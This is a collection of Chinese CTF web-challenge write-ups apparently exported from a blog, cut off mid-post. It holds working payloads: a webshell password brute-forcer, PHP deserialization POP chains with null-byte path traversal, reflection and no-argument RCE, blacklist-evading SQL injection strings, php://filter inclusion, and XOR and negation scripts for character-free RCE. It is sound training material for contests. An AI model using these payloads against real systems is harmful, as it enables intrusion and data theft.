[{"title":"2022陕西省赛","url":"/2023/06/24/2022%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/","content":"被加密的后门打开来是一个酷炫的页面\n\n然后扫描，有www.zip,fuck.php\n但是wp上的a.txt我没有扫到\n\n这里猜测是木马文件，还要有密码\n应该就是蚁剑链接的密码\nimport requestsimport timefrom tqdm import tqdmburp0_url = &quot;http://499b1259.clsadp.com/fuck.php&quot;import hashlib as mddictionary=str()with open(&quot;a.txt&quot;,&quot;r&quot;,encoding=&#x27;utf-8&#x27;) as e:    dictionary=e.readlines()for i in tqdm(range(len(dictionary))):    dictionary[i]=md.md5(dictionary[i].strip(&#x27;\\n&#x27;).encode(encoding=&#x27;utf-8&#x27;)).hexdigest()    burp0_data = &#123;&quot;&#123;0&#125;&quot;.format(dictionary[i]): &quot;system(&#x27;pwd&#x27;);&quot;&#125;    a=requests.post(burp0_url, data=burp0_data).text    if &#x27;www&#x27; in a:        print(dictionary[i])    else:        continue\n\n官方脚本，很慢\nspa&amp;col感觉前面真的很需要密码师傅\n扫出robots.txt\n\nbase92第一个\n\n下面是一个没见过的加密，直接在线\n\n\n这里才是web手该干的事情\n","categories":["writeups"],"tags":["信息收集","md5","fast_destruct","无参数rce","php反射类"]},{"title":"2023陕西省赛","url":"/2023/06/03/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/","content":"ezrce\n按key的按钮就出现了逻辑源码\n&lt;?phperror_reporting(0);include &#x27;waf.php&#x27;;header(&quot;Content-Type:text/html;charset=utf-8&quot;);echo &quot;你是谁啊哥们？把钥匙给我！！！！&lt;br/&gt;&quot;;$key=$_GET[&#x27;key&#x27;];$name=$_POST[&#x27;name&#x27;];$qaq=waf($_POST[&#x27;qaq&#x27;]);if (isset($_GET[&#x27;key&#x27;]))&#123;  highlight_file(__FILE__);&#125;if (isset($name))&#123;    echo &quot;你是&quot;.$name.&quot;大人????&lt;br/&gt;&quot;;    $name1=preg_replace(&#x27;/hahaha/e&#x27;,$qaq,$name);    echo &quot;骗我的吧，你明明是    &gt;&gt;&gt;&gt;小小&quot;.$name1;&#125;?&gt;\n\n&#x2F;e是当php代码执行\n\n\n看源代码就是会执行我们的$qaq，前面的name要被完全替换掉\n这里的key干什么不知道，但是我看了robots.txt没有什么东西\n尝试rce\nblacklist：全部数字，*，^,单双引号，/，`，.,\\，?, ,,-,~\n\n\n测不太出来\n但是我的思路是没有问题的\n因为\n\nphpinfo()成功了\n然后会一直被ban\n好像所有字符都没有用，后来想到可以用session做\n\n这样确实就用不到所有的字符，_和()都是之前测过可以用的。其实就是无参数rce的思想，之前也有学习过，核心点就是i利用没有参数的函数得flag\n这里就是记录一下session_id\nshow_souce把flag文件的内容展示了出来\nhttps://blog.csdn.net/weixin_46330722/article/details/110840156\nezpop &lt;?phphighlight_file(__FILE__);class night&#123;    public $night;    public function __destruct()&#123;        echo $this-&gt;night . &#x27;哒咩哟&#x27;;    &#125;&#125;class day&#123;    public $day;    public function __toString()&#123;        echo $this-&gt;day-&gt;go();    &#125;    public function __call($a, $b)&#123;        echo $this-&gt;day-&gt;getFlag();    &#125;&#125;class light&#123;    public $light;    public function __invoke()&#123;        echo $this-&gt;light-&gt;d();    &#125;&#125;class dark&#123;    public $dark;    public function go()&#123;        ($this-&gt;dark)();    &#125;    public function getFlag()&#123;        include(hacked($this-&gt;dark));    &#125;&#125;function hacked($s) &#123;    if(substr($s, 0,1) == &#x27;/&#x27;)&#123;        die(&#x27;呆jio步&#x27;);    &#125;    $s = preg_replace(&#x27;/\\.\\.*/&#x27;, &#x27;.&#x27;, $s);    $s = urldecode($s);    $s = htmlentities($s, ENT_QUOTES, &#x27;UTF-8&#x27;);    return strip_tags($s);&#125;$un = unserialize($_POST[&#x27;‮⁦快给我传参⁩⁦pop&#x27;]); // throw new Exception(&#x27;seino&#x27;); \n\n抓包就可以得到这段源码\npoc\n&lt;?phpclass night&#123;    public $night;&#125;class day&#123;    public $day;&#125;class light&#123;    public $light;&#125;class dark&#123;    public $dark;&#125;$flag = new night();$flag -&gt; night = new day();$flag -&gt; night -&gt; day = new dark();$flag -&gt; night -&gt; day -&gt; dark = new light();$flag -&gt; night -&gt; day -&gt; dark -&gt; light = new day();$flag -&gt; night -&gt; day -&gt; dark -&gt; light -&gt; day = new dark();$flag -&gt; night -&gt; day -&gt; dark -&gt; light -&gt; day -&gt; dark = &#x27;.%00%00./%00.%00%00./%00.%00%00./flag&#x27;;var_dump(urlencode(serialize($flag)));//&quot;O:5:&quot;night&quot;:1:&#123;s:5:&quot;night&quot;;O:8:&quot;stdClass&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;O:5:&quot;light&quot;:1:&#123;s:5:&quot;light&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;s:37:&quot;.%00%00./%00.%00%00./%00.%00%00./flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;&quot;//&quot;O:5:&quot;night&quot;:1:&#123;s:5:&quot;night&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;O:5:&quot;light&quot;:1:&#123;s:5:&quot;light&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;s:37:&quot;.%00%00./%00.%00%00./%00.%00%00./flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;&quot;//&quot;O:5:&quot;night&quot;:1:&#123;s:5:&quot;night&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;O:5:&quot;light&quot;:1:&#123;s:5:&quot;light&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;s:37:&quot;.%00%00./%00.%00%00./%00.%00%00./flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;&quot;$flag1=&#x27;O:5:&quot;night&quot;:2:&#123;s:5:&quot;night&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;O:5:&quot;light&quot;:1:&#123;s:5:&quot;light&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;s:37:&quot;.%00%00./%00.%00%00./%00.%00%00./flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;&#x27;;echo urlencode($flag1);\n\n最后的payload要进行破坏触发fast_destruct\nthrow new Exception(&#x27;seino&#x27;); \n\n两个原因\n1.反序列化的返回值被复制了，生命周期延长\n2.有异常处理，会死\n所以要破坏\n提前触发fast_destruct\n方法：\n\nhttps://www.anquanke.com/post/id/251366#h2-3\nunserialize有robots.txt\n\n有提示\n\n没见过\n回去看看\n &lt;?phphighlight_file(__FILE__);header(&quot;Content-type:text/html;charset=utf-8&quot;);require_once &quot;waf.php&quot;;error_reporting(0);class getFlag&#123;    private $password;    private $cmd;    public function __destruct()&#123;        if($this-&gt;password==&quot;‮⁦  //how to change the private variables⁩⁦secret&quot;)&#123;            system($this-&gt;cmd);        &#125;    &#125;&#125;$a = $_GET[&#x27;a&#x27;];if(isset($_GET[&#x27;a&#x27;]))&#123;    @eval(waf($a));&#125;?&gt;\n\n源码是这个，让我修改私有属性emmmm，结合一下hint\n查到了是用php反射类去做。\n注意源码这里又有不可见字符，这个比赛真的喜欢搞这个\n还有一个eval函数，这里我们必须利用她执行php代码，不然我们没有办法。官方的exp，其实也就是记住用反射类可以外部修改私有属性\nhttp://505f116c.clsadp.com/?a=$flag = new getFlag();$reflectionObject = new ReflectionObject($flag);$reflectionProperty = $reflectionObject-&gt;getProperty(&#x27;password&#x27;);$reflectionProperty-&gt;setAccessible(true);$reflectionProperty-&gt;setValue($flag, &quot;‮⁦  //how to change the private variables⁩⁦secret&quot;);$reflectionProperty = $reflectionObject-&gt;getProperty(&#x27;cmd&#x27;);$reflectionProperty-&gt;setAccessible(true);$reflectionProperty-&gt;setValue($flag, &#x27;cat /f*&#x27;);\n\n","categories":["writeups"],"tags":["fast_destruct","无参数rce","php反射类","rce","pop"]},{"title":"HNCTF-2022-WEEk2","url":"/2023/05/18/HNCTF-2022-WEEk2/","content":"[HNCTF 2022 WEEK2]easy_include文件包含的基础梳理一下\n\n这里抄一张图：来自https://blog.csdn.net/qq_45300786/article/details/108724251\n为什么要有文件包含，其实这个是一个非常妙也是很正常的一个思想，为了代码不要去有那么多的冗余\n就用文件包含函数去包含，文件包含不在意后缀，只要是php代码，什么后缀都可以执行\n本地文件包含和远程文件包含\n这道题就是利用了本地文件包含\nnginx如果access.log可以访问，也就是过滤不全，被我们提权了，就可以在ua里面进行命令执行，因为返回的就是ua，所以就是在ua里面\n\n这里好像可以用一句话木马，但是我没有成功，是不明白为什么\n[HNCTF 2022 WEEK2]ez_SSTIfenjing\n\n[HNCTF 2022 WEEK2]ez_ssrf人家写的很好\nhttps://boogipop.com/2022/10/07/HNCTF%5Bez_ssrf%5D/![image-20230518215959113](HNCTF-2022-WEEk2/image-20230518215959113.png)\n[HNCTF 2022 WEEK2]Canyource无参数rce，之前也总结过\n其实核心思想就是利用无参数的函数不择手段的去完成rce，\n\npayload：http://node2.anna.nssctf.cn:28302/?code=readfile(next(array_reverse(scandir(current(localeconv())))));\n\nhttps://zhuanlan.zhihu.com/p/157431794\nhttps://www.cnblogs.com/upstream-yu/p/15062311.html\n[HNCTF 2022 WEEK2]easy_unser &lt;?php     include &#x27;f14g.php&#x27;;    error_reporting(0);    highlight_file(__FILE__);    class body&#123;    private $want,$todonothing = &quot;i can&#x27;t get you want,But you can tell me before I wake up and change my mind&quot;;    public function  __construct($want)&#123;        $About_me = &quot;When the object is created,I will be called&quot;;        if($want !== &quot; &quot;) $this-&gt;want = $want;        else $this-&gt;want = $this-&gt;todonothing;    &#125;    function __wakeup()&#123;        $About_me = &quot;When the object is unserialized,I will be called&quot;;        $but = &quot;I can CHANGE you&quot;;        $this-&gt; want = $but;        echo &quot;C1ybaby!&quot;;            &#125;    function __destruct()&#123;        $About_me = &quot;I&#x27;m the final function,when the object is destroyed,I will be called&quot;;        echo &quot;So,let me see if you can get what you want\\n&quot;;        if($this-&gt;todonothing === $this-&gt;want)            die(&quot;鲍勃,别傻愣着!\\n&quot;);        if($this-&gt;want == &quot;I can CHANGE you&quot;)            die(&quot;You are not you....&quot;);        if($this-&gt;want == &quot;f14g.php&quot; OR is_file($this-&gt;want))&#123;            die(&quot;You want my heart?No way!\\n&quot;);        &#125;else&#123;            echo &quot;You got it!&quot;;            highlight_file($this-&gt;want);            &#125;    &#125;&#125;    class unserializeorder&#123;        public $CORE = &quot;人类最大的敌人,就是无序. Yahi param vaastavikta hai!&lt;BR&gt;&quot;;        function __sleep()&#123;            $About_me = &quot;When the object is serialized,I will be called&quot;;            echo &quot;We Come To HNCTF,Enjoy the ser14l1zti0n &lt;BR&gt;&quot;;        &#125;        function __toString()&#123;            $About_me = &quot;When the object is used as a string,I will be called&quot;;            return $this-&gt;CORE;        &#125;    &#125;        $obj = new unserializeorder();    echo $obj;    $obj = serialize($obj);        if (isset($_GET[&#x27;ywant&#x27;]))    &#123;        $ywant = @unserialize(@$_GET[&#x27;ywant&#x27;]);        echo $ywant;    &#125;?&gt;人类最大的敌人,就是无序. Yahi param vaastavikta hai!We Come To HNCTF,Enjoy the ser14l1zti0n\n\n反序列化\n进行分析审计\n\n里面其实也就是用到了\n&lt;?php//Tenclass body&#123;private $todonothing = &quot;test&quot;;private $want=&#x27;./test/../f14g.php&#x27;;&#125;$obj = new body();echo (urlencode(serialize($obj)));\n\n粘贴一个别人的exp\nfunction __destruct()&#123;       $About_me = &quot;I&#x27;m the final function,when the object is destroyed,I will be called&quot;;       echo &quot;So,let me see if you can get what you want\\n&quot;;       if($this-&gt;todonothing === $this-&gt;want)           die(&quot;鲍勃,别傻愣着!\\n&quot;);       if($this-&gt;want == &quot;I can CHANGE you&quot;)           die(&quot;You are not you....&quot;);       if($this-&gt;want == &quot;f14g.php&quot; OR is_file($this-&gt;want))&#123;           die(&quot;You want my heart?No way!\\n&quot;);       &#125;else&#123;           echo &quot;You got it!&quot;;           highlight_file($this-&gt;want);           &#125;   &#125;\n\n[HNCTF 2022 WEEK2]easy_sql\nsql注入的题，测试\n自测blacklist：空格，and，information_schema.tables ，table_schema \ninformation_schema.tables 可以用 mysql.innodb_table_stats 代替table_schema 可以用 database_name 代替\npayload\n数据库名1&#x27;/**/union/**/select/**/1,2,database()/**/where/**/&#x27;1//这个好像是错的查表名0&#x27;/**/union/**/select/**/1,2,group_concat(database_name)/**/from/**/mysql.innodb_table_stats/**/where/**/&#x27;1查列名0&#x27;/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/&#x27;1这里用的是innodb引擎，就不要加限制条件，给啥都看查字符串0&#x27;union/**/select/**/1,2,group_concat(`1`)/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/ctftraining.flag)a/**/where/**/&#x27;1\n\n\n\nhttps://wpscan.com/vulnerability/8acc0fc6-efe6-4662-b9ac-6342a7823328\n[HNCTF 2022 WEEK2]ohmywordpresshttps://blog.csdn.net/bossDDYY/article/details/127581507\n一个cve\n","categories":["writeups"],"tags":["SQL注入","SSTI","ssrf","文件包含","CVE-2022-0760","反序列化"]},{"title":"HNCTF 2022 week1 Writeup","url":"/2023/05/05/HNCTF2022Week1%E9%83%A8%E5%88%86wp/","content":"[HNCTF 2022 Week1]easy_html\n看看cookie\n\n\n有个框框，来我们猜猜是什么?xss ,ssti,sql?\n\n但是我发现这里好像只有10个位置，我的思路第一时间想到1到9999999999爆破。经过我的不断尝试，发现，我是呆逼\n手机号怎么可能只有10位呢。\n\n随便修改前端为超过10的数，然后输入10个以上的数就ok了\n亏得我电脑风扇还飞了起来\n\n[HNCTF 2022 Week1]Interesting_include\n读题就是过滤了大小写flag\n这种直接用过滤器，因为正则匹配都是匹配字符，而过滤器传递的是路径当攻击者使用php://filter/read=convert.base64-encode/resource=flag.php作为filter参数时，PHP解析器会将这个参数作为一个文件路径，传递给include函数。因为这个参数不是一个标准的文件路径，而是一个流过滤器，因此在执行include函数时，会先对这个参数进行处理，将flag.php文件的内容转换为base64编码，再输出到标准输出流中。\n\n[HNCTF 2022 Week1]easy_upload基础中的基础，直接改后缀名为php，蚁剑连接根目录一看就有了\n[HNCTF 2022 Week1]Interesting_http一开始叫我们post一个want\n按他说的做\n\n然后想要啥flag\n\n肯定没那么简单\n这种不是管理员一般看看cookie\n\n改改\n\nxff改改\n\n[HNCTF 2022 Week1]Challenge__rce\n传个hint试试\n\n一眼顶真\n\n无字符rce\n一直有接触但是没有系统学习，这里来一波。\n\n参考：https://xz.aliyun.com/t/8107\n\n最简单的无字符过滤\n&lt;?phpif(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$_GET[&#x27;shell&#x27;])) &#123;  eval($_GET[&#x27;shell&#x27;]);&#125;\n\n研究这段代码的绕过\n异或我们先从异或看起\n\n输出是’o’，我们来分析下原因,5的ASCII码是53,转成二进制是00110101,Z的ASCII码是90,转成二进制是01011010,将他们进行异或,为,也即十进制的111,为o\n\n再学习一下这段代码\n刚刚讲过’5’^’Z’为’o’\n这样我们就将$__赋值为’o’然后php允许把字符串当函数用。这样我们就成功的调用了o()这个函数\n$_是一个没有定义过的变量，php会给他赋一个默认值NULL&#x3D;&#x3D;0\n那么这个1就不难理解了\n\n取反\n先用python输出一个字符的utf8编码\n\n输出了一手rr，emmmm，为什么呢？\n\n还记得我们的python输出了什么吗\n\\xe5\\x8d\\xa2\n我们定义一个变量$_等于卢，里面有三个字节，取1就是第二个，\\x8d\n这样就可以得到一个ascii码字符\n总之我们就需要知道，对于一个汉字进行($x{0})或($x{1})或~($x{2})的操作，可以得到某个ASCII码的字符值\n一个版本问题PHP5中有一个函数是assert()，这是一个断言函数，用于测试阶段进行判断条件\n可以在php5里面这么用\n$_&#x3D;assert;\n$_()\n就是这么用，对这么用\n\n但是在php7及以上不行了。但是有别的方法\n\nPHP5中，是不支持($a)()这种调用方法的，但在PHP7中支持这种调用方法，因此支持这么写(‘phpinfo’)();\n\nphp中的短标签1.\n这个相当与&lt;?php&gt;\n2.\n这个相当&lt;?echo&gt;\n举个例子\n\n\n\nok的喔\n大部分文章说短标签需要在php.ini中设置short_open_tag为on才能开启短标签(默认是开启的，但似乎又默认注释，所以还是等于没开启)。但实际上在PHP5.4以后，无论short_open_tag是否开启，这种写法总是适用的，这种写法则需要short_open_tag开启才行。\n所以还是需要注意一些版本问题\nphp中的反引号反引号可以当命令执行用知道吧，很常见的一个姿势\n&lt;?php$_=`whoami`;echo $_;\n\n\n结合上面的短标签就可以这么写\n\n效果是一样的\n好了前置知识结束，相信你和我一样觉得这些东西零零碎碎，没什么用接下来进入实操\n\n异或实操&lt;?php$shell = &quot;assert&quot;;$result1 = &quot;&quot;;$result2 = &quot;&quot;;for($num=0;$num&lt;=strlen($shell);$num++)&#123;    for($x=33;$x&lt;=126;$x++)    &#123;        if(judge(chr($x)))        &#123;            for($y=33;$y&lt;=126;$y++)            &#123;                if(judge(chr($y)))                &#123;                    $f = chr($x)^chr($y);                    if($f == $shell[$num])                    &#123;                        $result1 .= chr($x);                        $result2 .= chr($y);                        break 2;                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;echo $result1;echo &quot;  &quot;;echo $result2;function judge($c)&#123;    if(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$c))    &#123;        return true;    &#125;    return false;&#125;\n\n来理解理解吧\n还记的异或吗，我们需要得到一个可见函数，就是一个一个得到其中的字母或者数字，我们可以用循环异或非字母或者数字的方式的方式得到这个函数\n注意一个比较少用的语法，break 2，就是跳出两层循环\n\n取反实操&lt;?phpheader(&quot;Content-type:text/html;charset=utf-8&quot;);$shell = &quot;assert&quot;;$result = &quot;&quot;;$arr =array();$word = &quot;一乙二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙平灭轧东卡北占业旧帅归且旦目叶甲申叮电号田由史只央兄叼叫另叨叹四生失禾丘付仗代仙们仪白仔他斥瓜乎丛令用甩印乐句匆册犯外处冬鸟务包饥主市立闪兰半汁汇头汉宁穴它讨写让礼训必议讯记永司尼民出辽奶奴加召皮边发孕圣对台矛纠母幼丝式刑动扛寺吉扣考托老执巩圾扩扫地扬场耳共芒亚芝朽朴机权过臣再协西压厌在有百存而页匠夸夺灰达列死成夹轨邪划迈毕至此贞师尘尖劣光当早吐吓虫曲团同吊吃因吸吗屿帆岁回岂刚则肉网年朱先丢舌竹迁乔伟传乒乓休伍伏优伐延件任伤价份华仰仿伙伪自血向似后行舟全会杀合兆企众爷伞创肌朵杂危旬旨负各名多争色壮冲冰庄庆亦刘齐交次衣产决充妄闭问闯羊并关米灯州汗污江池汤忙兴宇守宅字安讲军许论农讽设访寻那迅尽导异孙阵阳收阶阴防奸如妇好她妈戏羽观欢买红纤级约纪驰巡寿弄麦形进戒吞远违运扶抚坛技坏扰拒找批扯址走抄坝贡攻赤折抓扮抢孝均抛投坟抗坑坊抖护壳志扭块声把报却劫芽花芹芬苍芳严芦劳克苏杆杠杜材村杏极李杨求更束豆两丽医辰励否还歼来连步坚旱盯呈时吴助县里呆园旷围呀吨足邮男困吵串员听吩吹呜吧吼别岗帐财针钉告我乱利秃秀私每兵估体何但伸作伯伶佣低你住位伴身皂佛近彻役返余希坐谷妥含邻岔肝肚肠龟免狂犹角删条卵岛迎饭饮系言冻状亩况床库疗应冷这序辛弃冶忘闲间闷判灶灿弟汪沙汽沃泛沟没沈沉怀忧快完宋宏牢究穷灾良证启评补初社识诉诊词译君灵即层尿尾迟局改张忌际陆阿陈阻附妙妖妨努忍劲鸡驱纯纱纳纲驳纵纷纸纹纺驴纽奉玩环武青责现表规抹拢拔拣担坦押抽拐拖拍者顶拆拥抵拘势抱垃拉拦拌幸招坡披拨择抬其取苦若茂苹苗英范直茄茎茅林枝杯柜析板松枪构杰述枕丧或画卧事刺枣雨卖矿码厕奔奇奋态欧垄妻轰顷转斩轮软到非叔肯齿些虎虏肾贤尚旺具果味昆国昌畅明易昂典固忠咐呼鸣咏呢岸岩帖罗帜岭凯败贩购图钓制知垂牧物乖刮秆和季委佳侍供使例版侄侦侧凭侨佩货依的迫质欣征往爬彼径所舍金命斧爸采受乳贪念贫肤肺肢肿胀朋股肥服胁周昏鱼兔狐忽狗备饰饱饲变京享店夜庙府底剂郊废净盲放刻育闸闹郑券卷单炒炊炕炎炉沫浅法泄河沾泪油泊沿泡注泻泳泥沸波泼泽治怖性怕怜怪学宝宗定宜审宙官空帘实试郎诗肩房诚衬衫视话诞询该详建肃录隶居届刷屈弦承孟孤陕降限妹姑姐姓始驾参艰线练组细驶织终驻驼绍经贯奏春帮珍玻毒型挂封持项垮挎城挠政赴赵挡挺括拴拾挑指垫挣挤拼挖按挥挪某甚革荐巷带草茧茶荒茫荡荣故胡南药标枯柄栋相查柏柳柱柿栏树要咸威歪研砖厘厚砌砍面耐耍牵残殃轻鸦皆背战点临览竖省削尝是盼眨哄显哑冒映星昨畏趴胃贵界虹虾蚁思蚂虽品咽骂哗咱响哈咬咳哪炭峡罚贱贴骨钞钟钢钥钩卸缸拜看矩怎牲选适秒香种秋科重复竿段便俩贷顺修保促侮俭俗俘信皇泉鬼侵追俊盾待律很须叙剑逃食盆胆胜胞胖脉勉狭狮独狡狱狠贸怨急饶蚀饺饼弯将奖哀亭亮度迹庭疮疯疫疤姿亲音帝施闻阀阁差养美姜叛送类迷前首逆总炼炸炮烂剃洁洪洒浇浊洞测洗活派洽染济洋洲浑浓津恒恢恰恼恨举觉宣室宫宪突穿窃客冠语扁袄祖神祝误诱说诵垦退既屋昼费陡眉孩除险院娃姥姨姻娇怒架贺盈勇怠柔垒绑绒结绕骄绘给络骆绝绞统耕耗艳泰珠班素蚕顽盏匪捞栽捕振载赶起盐捎捏埋捉捆捐损都哲逝捡换挽热恐壶挨耻耽恭莲莫荷获晋恶真框桂档桐株桥桃格校核样根索哥速逗栗配翅辱唇夏础破原套逐烈殊顾轿较顿毙致柴桌虑监紧党晒眠晓鸭晃晌晕蚊哨哭恩唤啊唉罢峰圆贼贿钱钳钻铁铃铅缺氧特牺造乘敌秤租积秧秩称秘透笔笑笋债借值倚倾倒倘俱倡候俯倍倦健臭射躬息徒徐舰舱般航途拿爹爱颂翁脆脂胸胳脏胶脑狸狼逢留皱饿恋桨浆衰高席准座脊症病疾疼疲效离唐资凉站剖竞部旁旅畜阅羞瓶拳粉料益兼烤烘烦烧烛烟递涛浙涝酒涉消浩海涂浴浮流润浪浸涨烫涌悟悄悔悦害宽家宵宴宾窄容宰案请朗诸读扇袜袖袍被祥课谁调冤谅谈谊剥恳展剧屑弱陵陶陷陪娱娘通能难预桑绢绣验继球理捧堵描域掩捷排掉堆推掀授教掏掠培接控探据掘职基著勒黄萌萝菌菜萄菊萍菠营械梦梢梅检梳梯桶救副票戚爽聋袭盛雪辅辆虚雀堂常匙晨睁眯眼悬野啦晚啄距跃略蛇累唱患唯崖崭崇圈铜铲银甜梨犁移笨笼笛符第敏做袋悠偿偶偷您售停偏假得衔盘船斜盒鸽悉欲彩领脚脖脸脱象够猜猪猎猫猛馅馆凑减毫麻痒痕廊康庸鹿盗章竟商族旋望率着盖粘粗粒断剪兽清添淋淹渠渐混渔淘液淡深婆梁渗情惜惭悼惧惕惊惨惯寇寄宿窑密谋谎祸谜逮敢屠弹随蛋隆隐婚婶颈绩绪续骑绳维绵绸绿琴斑替款堪搭塔越趁趋超提堤博揭喜插揪搜煮援裁搁搂搅握揉斯期欺联散惹葬葛董葡敬葱落朝辜葵棒棋植森椅椒棵棍棉棚棕惠惑逼厨厦硬确雁殖裂雄暂雅辈悲紫辉敞赏掌晴暑最量喷晶喇遇喊景践跌跑遗蛙蛛蜓喝喂喘喉幅帽赌赔黑铸铺链销锁锄锅锈锋锐短智毯鹅剩稍程稀税筐等筑策筛筒答筋筝傲傅牌堡集焦傍储奥街惩御循艇舒番释禽腊脾腔鲁猾猴然馋装蛮就痛童阔善羡普粪尊道曾焰港湖渣湿温渴滑湾渡游滋溉愤慌惰愧愉慨割寒富窜窝窗遍裕裤裙谢谣谦属屡强粥疏隔隙絮嫂登缎缓编骗缘瑞魂肆摄摸填搏塌鼓摆携搬摇搞塘摊蒜勤鹊蓝墓幕蓬蓄蒙蒸献禁楚想槐榆楼概赖酬感碍碑碎碰碗碌雷零雾雹输督龄鉴睛睡睬鄙愚暖盟歇暗照跨跳跪路跟遣蛾蜂嗓置罪罩错锡锣锤锦键锯矮辞稠愁筹签简毁舅鼠催傻像躲微愈遥腰腥腹腾腿触解酱痰廉新韵意粮数煎塑慈煤煌满漠源滤滥滔溪溜滚滨粱滩慎誉塞谨福群殿辟障嫌嫁叠缝缠静碧璃墙撇嘉摧截誓境摘摔聚蔽慕暮蔑模榴榜榨歌遭酷酿酸磁愿需弊裳颗嗽蜻蜡蝇蜘赚锹锻舞稳算箩管僚鼻魄貌膜膊膀鲜疑馒裹敲豪膏遮腐瘦辣竭端旗精歉熄熔漆漂漫滴演漏慢寨赛察蜜谱嫩翠熊凳骡缩慧撕撒趣趟撑播撞撤增聪鞋蕉蔬横槽樱橡飘醋醉震霉瞒题暴瞎影踢踏踩踪蝶蝴嘱墨镇靠稻黎稿稼箱箭篇僵躺僻德艘膝膛熟摩颜毅糊遵潜潮懂额慰劈操燕薯薪薄颠橘整融醒餐嘴蹄器赠默镜赞篮邀衡膨雕磨凝辨辩糖糕燃澡激懒壁避缴戴擦鞠藏霜霞瞧蹈螺穗繁辫赢糟糠燥臂翼骤鞭覆蹦镰翻鹰警攀蹲颤瓣爆疆壤耀躁嚼嚷籍魔灌蠢霸露囊罐匕刁丐歹戈夭仑讥冗邓艾夯凸卢叭叽皿凹囚矢乍尔冯玄邦迂邢芋芍吏夷吁吕吆屹廷迄臼仲伦伊肋旭匈凫妆亥汛讳讶讹讼诀弛阱驮驯纫玖玛韧抠扼汞扳抡坎坞抑拟抒芙芜苇芥芯芭杖杉巫杈甫匣轩卤肖吱吠呕呐吟呛吻吭邑囤吮岖牡佑佃伺囱肛肘甸狈鸠彤灸刨庇吝庐闰兑灼沐沛汰沥沦汹沧沪忱诅诈罕屁坠妓姊妒纬玫卦坷坯拓坪坤拄拧拂拙拇拗茉昔苛苫苟苞茁苔枉枢枚枫杭郁矾奈奄殴歧卓昙哎咕呵咙呻啰咒咆咖帕账贬贮氛秉岳侠侥侣侈卑刽刹肴觅忿瓮肮肪狞庞疟疙疚卒氓炬沽沮泣泞泌沼怔怯宠宛衩祈诡帚屉弧弥陋陌函姆虱叁绅驹绊绎契贰玷玲珊拭拷拱挟垢垛拯荆茸茬荚茵茴荞荠荤荧荔栈柑栅柠枷勃柬砂泵砚鸥轴韭虐昧盹咧昵昭盅勋哆咪哟幽钙钝钠钦钧钮毡氢秕俏俄俐侯徊衍胚胧胎狰饵峦奕咨飒闺闽籽娄烁炫洼柒涎洛恃恍恬恤宦诫诬祠诲屏屎逊陨姚娜蚤骇耘耙秦匿埂捂捍袁捌挫挚捣捅埃耿聂荸莽莱莉莹莺梆栖桦栓桅桩贾酌砸砰砾殉逞哮唠哺剔蚌蚜畔蚣蚪蚓哩圃鸯唁哼唆峭唧峻赂赃钾铆氨秫笆俺赁倔殷耸舀豺豹颁胯胰脐脓逛卿鸵鸳馁凌凄衷郭斋疹紊瓷羔烙浦涡涣涤涧涕涩悍悯窍诺诽袒谆祟恕娩骏琐麸琉琅措捺捶赦埠捻掐掂掖掷掸掺勘聊娶菱菲萎菩萤乾萧萨菇彬梗梧梭曹酝酗厢硅硕奢盔匾颅彪眶晤曼晦冕啡畦趾啃蛆蚯蛉蛀唬唾啤啥啸崎逻崔崩婴赊铐铛铝铡铣铭矫秸秽笙笤偎傀躯兜衅徘徙舶舷舵敛翎脯逸凰猖祭烹庶庵痊阎阐眷焊焕鸿涯淑淌淮淆渊淫淳淤淀涮涵惦悴惋寂窒谍谐裆袱祷谒谓谚尉堕隅婉颇绰绷综绽缀巢琳琢琼揍堰揩揽揖彭揣搀搓壹搔葫募蒋蒂韩棱椰焚椎棺榔椭粟棘酣酥硝硫颊雳翘凿棠晰鼎喳遏晾畴跋跛蛔蜒蛤鹃喻啼喧嵌赋赎赐锉锌甥掰氮氯黍筏牍粤逾腌腋腕猩猬惫敦痘痢痪竣翔奠遂焙滞湘渤渺溃溅湃愕惶寓窖窘雇谤犀隘媒媚婿缅缆缔缕骚瑟鹉瑰搪聘斟靴靶蓖蒿蒲蓉楔椿楷榄楞楣酪碘硼碉辐辑频睹睦瞄嗜嗦暇畸跷跺蜈蜗蜕蛹嗅嗡嗤署蜀幌锚锥锨锭锰稚颓筷魁衙腻腮腺鹏肄猿颖煞雏馍馏禀痹廓痴靖誊漓溢溯溶滓溺寞窥窟寝褂裸谬媳嫉缚缤